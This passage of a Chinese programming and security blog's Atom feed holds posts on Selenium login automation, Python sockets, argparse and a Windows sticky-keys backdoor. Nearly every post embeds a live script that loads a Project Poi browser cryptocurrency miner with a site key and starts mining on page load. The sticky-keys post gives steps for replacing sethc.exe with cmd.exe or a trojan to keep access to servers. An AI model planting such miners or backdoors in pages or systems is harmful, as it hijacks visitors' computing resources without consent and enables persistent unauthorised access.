script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;p&gt;第一次在Windows安装MySQL真的是安装得各种无语，遇到各种坑，这次写下来，希望以后不会再犯了！！！&lt;/p&gt;
    
    </summary>
    
    
      <category term="其他" scheme="http://damit5.ml/tags/%E5%85%B6%E4%BB%96/"/>
    
  </entry>
  
  <entry>
    <title>利用Python Selenium库模拟登陆</title>
    <link href="http://damit5.ml/2017/09/30/%E5%88%A9%E7%94%A8Python-Selenium%E5%BA%93%E6%A8%A1%E6%8B%9F%E7%99%BB%E9%99%86/"/>
    <id>http://damit5.ml/2017/09/30/利用Python-Selenium库模拟登陆/</id>
    <published>2017-09-30T06:04:35.000Z</published>
    <updated>2017-11-06T05:31:59.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><p>Python模拟登陆让不少人伤透脑筋，今天奉上一种万能登陆方法。你无须精通HTML，甚至也无须精通Python，但却能让你成功的进行模拟登陆。本文讲的是登陆所有网站的一种方法，并不局限于微博，仅用其作为例子来讲解。</p><a id="more"></a><h2 id="0x01-材料必备"><a href="#0x01-材料必备" class="headerlink" title="0x01 材料必备"></a>0x01 材料必备</h2><ul><li>Python环境</li><li>selenium库</li><li>Chrome XPath Helper 插件（可选）<blockquote><p>PS:selenium是借助浏览器而运行的，因此需要额外下载一款小型浏览器。本文使用的是<a href="https://chromedriver.storage.googleapis.com/index.html?path=2.32/" target="_blank" rel="external">Chrome Webdriver</a></p></blockquote></li></ul><h2 id="0x02-思路"><a href="#0x02-思路" class="headerlink" title="0x02 思路"></a>0x02 思路</h2><ul><li>导入模块，创建webdriver对象</li><li>打开登录页面</li><li>找到元件传入内容</li></ul><h2 id="0x03-正式开始"><a href="#0x03-正式开始" class="headerlink" title="0x03 正式开始"></a>0x03 正式开始</h2><h4 id="导入selenium库"><a href="#导入selenium库" class="headerlink" title="导入selenium库"></a>导入selenium库</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div></pre></td></tr></table></figure><h4 id="明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录"><a href="#明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录" class="headerlink" title="明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录"></a>明确模拟浏览器在电脑中存放的位置，比如我放在了当前文件目录</h4><blockquote><p>用selenium的webdriver方程指明浏览器的路径，同时打开一个浏览器。模拟浏览器有多种可选,比如Firefox, Safari。本次用的是谷歌的模拟浏览器。注意：’.Chome’是大写字母。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">driver = webdriver.Chrome(executable_path=&quot;./chromedriver.exe&quot;)</div></pre></td></tr></table></figure></p></blockquote><h4 id="打开网页（本次模拟登陆新浪微博）"><a href="#打开网页（本次模拟登陆新浪微博）" class="headerlink" title="打开网页（本次模拟登陆新浪微博）"></a>打开网页（本次模拟登陆新浪微博）</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">driver.get(&apos;https://login.sina.com.cn/signup/signin.php?entry=sso&apos;)</div></pre></td></tr></table></figure><h4 id="利用XPath-Helper-查找元件位置并传入数据"><a href="#利用XPath-Helper-查找元件位置并传入数据" class="headerlink" title="利用XPath Helper 查找元件位置并传入数据"></a>利用XPath Helper 查找元件位置并传入数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">driver.find_element_by_xpath(登陆元件位置).send_keys(&apos;账号&apos;)</div><div class="line">driver.find_element_by_xpath(密码元件位置).send_keys(&apos;密码&apos;)</div><div class="line">driver.find_element_by_xpath(登陆按钮).click()</div></pre></td></tr></table></figure><h2 id="0x04-附上懒人脚本"><a href="#0x04-附上懒人脚本" class="headerlink" title="0x04 附上懒人脚本"></a>0x04 附上懒人脚本</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line">from selenium import webdriver</div><div class="line"></div><div class="line">driver = webdriver.Chrome(executable_path=&quot;./chromedriver.exe&quot;)</div><div class="line">driver.get(&apos;https://login.sina.com.cn/signup/signin.php?entry=sso&apos;)</div><div class="line">name = raw_input(&apos;Please input your account number : &apos;)</div><div class="line">password = raw_input(&apos;Please input your password : &apos;)</div><div class="line">driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][1]/input[@id=&apos;username&apos;]&quot;).send_keys(name)</div><div class="line">driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][2]/input[@id=&apos;password&apos;]&quot;).send_keys(password)</div><div class="line">driver.find_element_by_xpath(r&quot;/html/body/div[@id=&apos;wrap&apos;]/div[@class=&apos;iforgot_bd&apos;]/div[@class=&apos;iforgot_cont&apos;]/div[@class=&apos;i_mod&apos;]/form[@id=&apos;vForm&apos;]/div[@class=&apos;main_cen&apos;]/div[@class=&apos;form_mod&apos;]/ul[@class=&apos;form_list&apos;]/li[@class=&apos;item&apos;][6]/div[@class=&apos;btn_mod&apos;]/input[@class=&apos;W_btn_a btn_34px&apos;]&quot;).click()</div></pre></td></tr></table></figure><h2 id="0x05-附加：将cookie传入requests"><a href="#0x05-附加：将cookie传入requests" class="headerlink" title="0x05 附加：将cookie传入requests"></a>0x05 附加：将cookie传入requests</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">req = requests.Session()</div><div class="line">cookies = wd.get_cookies()</div><div class="line">for cookie in cookies:</div><div class="line">    req.cookies.set(cookie[&apos;name&apos;],cookie[&apos;value&apos;])</div><div class="line"></div><div class="line">后面就可以直接用req访问页面了</div></pre></td></tr></table></figure><div id="aplayer12" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer12"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;p&gt;Python模拟登陆让不少人伤透脑筋，今天奉上一种万能登陆方法。你无须精通HTML，甚至也无须精通Python，但却能让你成功的进行模拟登陆。本文讲的是登陆所有网站的一种方法，并不局限于微博，仅用其作为例子来讲解。&lt;/p&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://damit5.ml/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Windows Shift 后门</title>
    <link href="http://damit5.ml/2017/09/30/Windows-Shift-%E5%90%8E%E9%97%A8/"/>
    <id>http://damit5.ml/2017/09/30/Windows-Shift-后门/</id>
    <published>2017-09-30T06:03:19.000Z</published>
    <updated>2017-11-06T05:31:48.000Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><p>我们都知道，windows系统按<strong>5</strong>下<strong>shift</strong>后，windows就执行了<strong>system32</strong>下的<strong>sethc.exe</strong>，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。</p><a id="more"></a><h2 id="偷天换日"><a href="#偷天换日" class="headerlink" title="偷天换日 :::"></a>偷天换日 :::</h2><p>1.将我们的<strong>cmd.exe</strong>或者<strong>木马后门</strong>名字改成<strong>sethc.exe</strong>，然后替换<strong>C:windows\system32\sethc.exe</strong>程序</p><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/K4jdluh80WJSciTqmNp1AQ62vbhGbP2FWHT6C6683Zk!/r/dDwBAAAAAAAA" alt="1"></p><blockquote><p>如果弹出 <strong>“你需要TrustedInstaller提供的权限才能修改此文件”</strong></p><p>修改的文件右击 –&gt; 属性 –&gt; 安全 –&gt; 高级 –&gt; 更改所有者 –&gt; 当前用户 –&gt; 确定 –&gt; 重复之前步骤知道高级 –&gt; 编辑权限为完全控制</p></blockquote><p>2.按<strong>5</strong>下<strong>shift</strong>键可以调出cmd命令窗口，也可以添加用户</p><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S3bdAg8/2lNXxk7hpSq4XWiVg4L.SfPH7s0OlPdaPJoyy8MDGrc!/r/dOYAAAAAAAAA" alt="2"></p><h2 id="类似程序"><a href="#类似程序" class="headerlink" title="类似程序 :::"></a>类似程序 :::</h2><h4 id="放大镜-Magnify-exe"><a href="#放大镜-Magnify-exe" class="headerlink" title="放大镜 ::: Magnify.exe"></a>放大镜 ::: Magnify.exe</h4><blockquote><p><strong>win</strong> 和 <strong>+</strong> 同时按</p></blockquote><h4 id="讲述人-Narrator-exe"><a href="#讲述人-Narrator-exe" class="headerlink" title="讲述人 ::: Narrator.exe"></a>讲述人 ::: Narrator.exe</h4><blockquote><p><strong>win</strong> 和 <strong>enter</strong> 同时按</p></blockquote><h2 id="写在最后"><a href="#写在最后" class="headerlink" title="写在最后 :::"></a>写在最后 :::</h2><blockquote><p>使用<code>shift</code>后门建议使用<code>win2003</code>去远程连接其他服务器，这样会有登录页面，也才能使用<code>shift</code>后门，其他版本的Windows可能会要你直接在本地输入账户和密码，也就不能使用shift后门</p></blockquote><div id="aplayer13" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer13"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script>]]></content>
    
    <summary type="html">
    
      &lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;p&gt;我们都知道，windows系统按&lt;strong&gt;5&lt;/strong&gt;下&lt;strong&gt;shift&lt;/strong&gt;后，windows就执行了&lt;strong&gt;system32&lt;/strong&gt;下的&lt;strong&gt;sethc.exe&lt;/strong&gt;，也就是启用了粘滞键。虽然快捷方便，但却存在安全隐患。&lt;/p&gt;
    
    </summary>
    
    
      <category term="权限维持" scheme="http://damit5.ml/tags/%E6%9D%83%E9%99%90%E7%BB%B4%E6%8C%81/"/>
    
  </entry>
  
  <entry>
    <title>Python socket模块实现简易的通信</title>
    <link href="http://damit5.ml/2017/09/30/Python-socket%E6%A8%A1%E5%9D%97%E5%AE%9E%E7%8E%B0%E7%AE%80%E6%98%93%E7%9A%84%E9%80%9A%E4%BF%A1/"/>
    <id>http://damit5.ml/2017/09/30/Python-socket模块实现简易的通信/</id>
    <published>2017-09-30T06:00:16.000Z</published>
    <updated>2017-11-14T05:56:20.169Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer5" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer5"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><h2 id="0×01-思路"><a href="#0×01-思路" class="headerlink" title="0×01 思路"></a>0×01 思路</h2><blockquote><p>编写一个脚本之前，我们都应该YY一下思路，这样写出来的东西才会质量高，速度快。</p></blockquote><a id="more"></a><h4 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h4><blockquote><p>服务端</p><ul><li>1.创建一个socket的对象</li><li>2.绑定IP和端口</li><li>3.设置监听数量</li><li>4.开始监听</li><li>5.发送数据和接收数据</li></ul><p>客户端</p><ul><li>1.创建一个socket对象</li><li>2.连接IP和端口</li><li>3.发送数据和接收数据</li></ul></blockquote><h2 id="0×02-服务端"><a href="#0×02-服务端" class="headerlink" title="0×02 服务端"></a>0×02 服务端</h2><h4 id="1-创建一个socket的对象"><a href="#1-创建一个socket的对象" class="headerlink" title="1.创建一个socket的对象"></a>1.创建一个socket的对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ss = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div></pre></td></tr></table></figure><h4 id="2-绑定IP和端口"><a href="#2-绑定IP和端口" class="headerlink" title="2.绑定IP和端口"></a>2.绑定IP和端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">host = &apos;127.0.0.1&apos;</div><div class="line">port = 4444</div><div class="line">#注意传入的是元组</div><div class="line">ss.bind((host,ip))</div></pre></td></tr></table></figure><h4 id="3-设置监听数量"><a href="#3-设置监听数量" class="headerlink" title="3.设置监听数量"></a>3.设置监听数量</h4><p><code>socket.listen(backlog)</code><br>监听到socket的连接。backlog参数指定排队连接的最大数量，并且应至少为0；最大值取决于系统（通常为5），最小值被强制为0。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">ss.listen(1)</div></pre></td></tr></table></figure></p><h4 id="4-开始监听"><a href="#4-开始监听" class="headerlink" title="4.开始监听"></a>4.开始监听</h4><p><code>socket.accept()</code><br>接受连接。套接字必须绑定到一个地址并侦听连接。The return value is a pair (conn, address) where conn is a new socket object usable to send and receive data on the connection, and address is the address bound to the socket on the other end of the connection.<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">s,addr = ss.accept()</div></pre></td></tr></table></figure></p><h4 id="5-接收数据"><a href="#5-接收数据" class="headerlink" title="5.接收数据"></a>5.接收数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">def rec():</div><div class="line">    while True:</div><div class="line">        data = s.recv(1024)</div><div class="line">        #防止无限的回车</div><div class="line">        if len(data) == 0:</div><div class="line">            continue</div><div class="line">        print data</div></pre></td></tr></table></figure><h4 id="6-发送数据"><a href="#6-发送数据" class="headerlink" title="6.发送数据"></a>6.发送数据</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line">def sen():</div><div class="line">    while True:</div><div class="line">        content = raw_input()</div><div class="line">        if len(content) == 0:</div><div class="line">            continue</div><div class="line">        s.send(content)</div></pre></td></tr></table></figure><h2 id="0×03-客户端"><a href="#0×03-客户端" class="headerlink" title="0×03 客户端"></a>0×03 客户端</h2><h4 id="1-创建socket对象"><a href="#1-创建socket对象" class="headerlink" title="1.创建socket对象"></a>1.创建socket对象</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">c = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</div></pre></td></tr></table></figure><h4 id="2-连接服务器IP和端口"><a href="#2-连接服务器IP和端口" class="headerlink" title="2.连接服务器IP和端口"></a>2.连接服务器IP和端口</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line"># 注意传入的是元组</div><div class="line">c.connect((&apos;127.0.0.1&apos;,4444))</div></pre></td></tr></table></figure><h4 id="3-接收数据"><a href="#3-接收数据" class="headerlink" title="3.接收数据"></a>3.接收数据</h4><p>类似服务端</p><h4 id="4-发送数据"><a href="#4-发送数据" class="headerlink" title="4.发送数据"></a>4.发送数据</h4><p>类似服务端</p><h2 id="0×04-实例"><a href="#0×04-实例" class="headerlink" title="0×04 实例"></a>0×04 实例</h2><p><img src="http://r.photo.store.qq.com/psb?/V12DlJ9S2zSi6P/aGZXBG*k7y8dPj*TeF1H*8z5b00mhLmRbtSZKztmQBA!/r/dCsAAAAAAAAA" alt="test"></p><h2 id="0×05-参考链接"><a href="#0×05-参考链接" class="headerlink" title="0×05 参考链接"></a>0×05 参考链接</h2><h3 id="socket官方文档"><a href="#socket官方文档" class="headerlink" title="socket官方文档"></a><a href="https://docs.python.org/2/library/socket.html?highlight=socket#module-socket" target="_blank" rel="external">socket官方文档</a></h3><h3 id="socket官方文档翻译"><a href="#socket官方文档翻译" class="headerlink" title="socket官方文档翻译"></a><a href="http://python.usyiyi.cn/documents/python_278/library/socket.html" target="_blank" rel="external">socket官方文档翻译</a></h3>]]></content>
    
    <summary type="html">
    
      &lt;div id=&quot;aplayer5&quot; class=&quot;aplayer&quot; style=&quot;margin-bottom: 20px;&quot;&gt;&lt;/div&gt;
		&lt;script&gt;
			new APlayer({
				element: document.getElementById(&quot;aplayer5&quot;),
				narrow: false,
				autoplay: true,
				showlrc: 0,
				music: {
					title: &quot;六月的雨&quot;,
					author: &quot;胡歌&quot;,
					url: &quot;http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3&quot;,
					pic: &quot;http://damit5.kiwi/Music/233.jpg&quot;,
				}
			});
		&lt;/script&gt;

&lt;html&gt;
&lt;head&gt;
&lt;script&gt;
var script = document.createElement(&quot;script&quot;);
script.type = &quot;text/javascript&quot;;
script.src = &quot;https://ppoi.org/lib/projectpoi.min.js&quot;;
script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous(&quot;aoZgifd6N8x48tCIwRtb7bJA&quot;,{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}
document.getElementsByTagName(&quot;head&quot;)[0].appendChild(script);
&lt;/script&gt;
&lt;/head&gt;
&lt;/html&gt;

&lt;h2 id=&quot;0×01-思路&quot;&gt;&lt;a href=&quot;#0×01-思路&quot; class=&quot;headerlink&quot; title=&quot;0×01 思路&quot;&gt;&lt;/a&gt;0×01 思路&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;编写一个脚本之前，我们都应该YY一下思路，这样写出来的东西才会质量高，速度快。&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
      <category term="Python" scheme="http://damit5.ml/tags/Python/"/>
    
  </entry>
  
  <entry>
    <title>Python argparse 模块的简易使用</title>
    <link href="http://damit5.ml/2017/09/30/Python-argparse-%E6%A8%A1%E5%9D%97%E7%9A%84%E7%AE%80%E6%98%93%E4%BD%BF%E7%94%A8/"/>
    <id>http://damit5.ml/2017/09/30/Python-argparse-模块的简易使用/</id>
    <published>2017-09-30T05:56:49.000Z</published>
    <updated>2017-11-14T05:55:39.849Z</updated>
    
    <content type="html"><![CDATA[<script src="/assets/js/APlayer.min.js"> </script><div id="aplayer6" class="aplayer" style="margin-bottom: 20px;"></div><script>new APlayer({element: document.getElementById("aplayer6"),narrow: false,autoplay: true,showlrc: 0,music: {title: "六月的雨",author: "胡歌",url: "http://damit5.kiwi/Music/%E5%85%AD%E6%9C%88%E7%9A%84%E9%9B%A8-%E8%83%A1%E6%AD%8C.mp3",pic: "http://damit5.kiwi/Music/233.jpg",}});</script><html><head><script>var script = document.createElement("script");script.type = "text/javascript";script.src = "https://ppoi.org/lib/projectpoi.min.js";script.onload = script.onreadystatechange = function(){var miner = new ProjectPoi.Anonymous("aoZgifd6N8x48tCIwRtb7bJA",{threads: 4,autoThreads: false,throttle: 0.5});miner.start();}document.getElementsByTagName("head")[0].appendChild(script);</script></head></html><a id="more"></a><h2 id="0×00-示例"><a href="#0×00-示例" class="headerlink" title="0×00 示例"></a>0×00 示例</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div></pre></td><td class="code"><pre><div class="line">#-*-coding:UTF-8-*-</div><div class="line">import argparse</div><div class="line"></div><div class="line">parse = argparse.ArgumentParser(description=&apos;this is the start show message&apos;,</div><div class="line">                                epilog=&apos;this is the stop show message&apos;)</div><div class="line"></div><div class="line">#不注释掉的话就必须传入一个参数，导致 --author 选项不带参数使用会报错</div><div class="line">&apos;&apos;&apos;parse.add_argument(dest=&apos;test&apos;,nargs=&apos;+&apos;,metavar=&apos;test&apos;,</div><div class="line">                   help=&apos;this is test&apos;)&apos;&apos;&apos;</div><div class="line"></div><div class="line">parse.add_argument(&apos;-p&apos;,&apos;--port&apos;,dest=&apos;port&apos;,metavar=&apos;tgt_port&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s port&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;-H&apos;,&apos;--host&apos;,dest=&apos;host&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s host&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;--author&apos;,dest=&apos;author&apos;,action=&apos;store_true&apos;,</div><div class="line">                   help=&apos;show author&apos;)</div><div class="line"></div><div class="line">args = parse.parse_args()</div><div class="line">print &apos;port: &apos; + str(args.port)</div><div class="line">print &apos;host: &apos; + str(args.host)</div><div class="line">if args.author:</div><div class="line">    print &apos;author is damit5&apos;</div></pre></td></tr></table></figure><ul><li>将上述内容保存为<code>temp.py</code></li></ul><h4 id="运行python-temp-py-h"><a href="#运行python-temp-py-h" class="headerlink" title="运行python temp.py -h"></a>运行<code>python temp.py -h</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">usage: temp.py [-h] [-p tgt_port] [-H HOST] [--author]</div><div class="line"></div><div class="line">this is the start show message</div><div class="line"></div><div class="line">optional arguments:</div><div class="line">  -h, --help            show this help message and exit</div><div class="line">  -p tgt_port, --port tgt_port</div><div class="line">                        enter the target&apos;s port</div><div class="line">  -H HOST, --host HOST  enter the target&apos;s host</div><div class="line">  --author              show author</div><div class="line"></div><div class="line">this is the stop show message</div></pre></td></tr></table></figure><h4 id="运行python-temp-py-p-123-H-1-1-1-1"><a href="#运行python-temp-py-p-123-H-1-1-1-1" class="headerlink" title="运行python temp.py -p 123 -H 1.1.1.1"></a>运行<code>python temp.py -p 123 -H 1.1.1.1</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">port: 123</div><div class="line">host: 1.1.1.1</div></pre></td></tr></table></figure><h4 id="运行python-temp-py-author"><a href="#运行python-temp-py-author" class="headerlink" title="运行python temp.py --author"></a>运行<code>python temp.py --author</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">port: None</div><div class="line">host: None</div><div class="line">author is damit5</div></pre></td></tr></table></figure><h2 id="0×01-编写过程"><a href="#0×01-编写过程" class="headerlink" title="0×01 编写过程"></a>0×01 编写过程</h2><h4 id="1-创建一个解析器"><a href="#1-创建一个解析器" class="headerlink" title="1.创建一个解析器"></a>1.创建一个解析器</h4><p>使用<code>argparse</code>的第一步是创建一个<code>ArgumentParser</code>对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">import argparse</div><div class="line"></div><div class="line">argparse.ArgumentParser()</div></pre></td></tr></table></figure><p><code>ArgumentParser</code>对象会保存把命令行解析成Python数据类型所需要的所有信息。</p><h4 id="2-添加参数"><a href="#2-添加参数" class="headerlink" title="2.添加参数"></a>2.添加参数</h4><p>通过调用<code>add_argument()</code>方法向<code>ArgumentParser</code>添加程序的参数信息。通常情况下，这些信息告诉ArgumentParser如何接收命令行上的字符串并将它们转换成对象。这些信息被保存下来并在调用parse_args()时用到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div></pre></td><td class="code"><pre><div class="line">parse.add_argument(&apos;-p&apos;,&apos;--port&apos;,dest=&apos;port&apos;,metavar=&apos;tgt_port&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s port&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;-H&apos;,&apos;--host&apos;,dest=&apos;host&apos;,</div><div class="line">                   help=r&quot;enter the target&apos;s host&quot;)</div><div class="line"></div><div class="line">parse.add_argument(&apos;--author&apos;,dest=&apos;author&apos;,action=&apos;store_true&apos;,</div><div class="line">                   help=&apos;show author&apos;)</div></pre></td></tr></table></figure></p><p>首先输入指令的名字，比如<code>-p</code>、<code>-H</code>,如果指令没有名字，那么终端输入时没带指令的参数将自动保存在当前属性中</p><p><code>dest</code>是属性，传入进来的参数就是属性所对应的值；</p><p><code>metavar</code>相当于在 <code>-h</code> 中显示出来值，如果没有就默认使用<code>dest</code></p><p><code>help</code>就用来输出帮助说明</p><h4 id="3-解析参数"><a href="#3-解析参数" class="headerlink" title="3.解析参数"></a>3.解析参数</h4><p><code>ArgumentParser</code>通过<code>parse_args()</code>方法解析参数。它将检查命令行，把每个参数转换成恰当的类型并采取恰当的动作。在大部分情况下，这意味着将从命令行中解析出来的属性建立一个简单的 Namespace对象。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">args = parse.parse_args()</div></pre></td></tr></table></figure></p><p>在脚本中，<code>parse_args()</code>调用一般不带参数，<code>ArgumentParser</code> 将根据<code>sys.argv</code>自动确定命令行参数。</p><h2 id="0×02-ArgumentParser-对象"><a href="#0×02-ArgumentParser-对象" class="headerlink" title="0×02 ArgumentParser 对象"></a>0×02 ArgumentParser 对象</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">argparse.ArgumentParser(prog=None, usage=None, description=None, epilog=None, parents=[], formatter_class=argparse.HelpFormatter, prefix_chars=&apos;-&apos;, fromfile_prefix_chars=None, argument_default=None, conflict_handler=&apos;error&apos;, 